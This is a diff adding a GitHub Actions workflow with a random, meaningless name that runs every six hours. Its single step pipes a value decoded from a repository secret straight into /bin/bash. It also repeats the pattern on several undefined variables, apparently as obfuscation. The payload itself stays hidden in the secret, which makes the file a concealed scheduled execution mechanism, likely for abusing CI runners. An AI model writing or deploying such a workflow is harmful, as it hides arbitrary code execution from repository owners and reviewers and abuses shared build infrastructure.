@@ -1,0 +1,25 @@
+name: qldeshenquwy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qldeshenquwy
+        env:
+          co001: ${{ secrets.co001 }}
+        run: |
+          echo $co001 | jq -r .absrg41 | /bin/bash
+          echo $arobf15954 | jq -r .ds1 | /bin/bash
+          echo $m14227 | jq -r .cu55410 | /bin/bash
+          echo $ct8 | jq -r .bbaz29 | /bin/bash
+          echo $eeql17659 | jq -r .rohcg401 | /bin/bash
+          echo $fjg2 | jq -r .tnd41313 | /bin/bash
+          echo $sczd99 | jq -r .oesuz990 | /bin/bash
+          echo $q86724 | jq -r .cedr0939 | /bin/bash
+
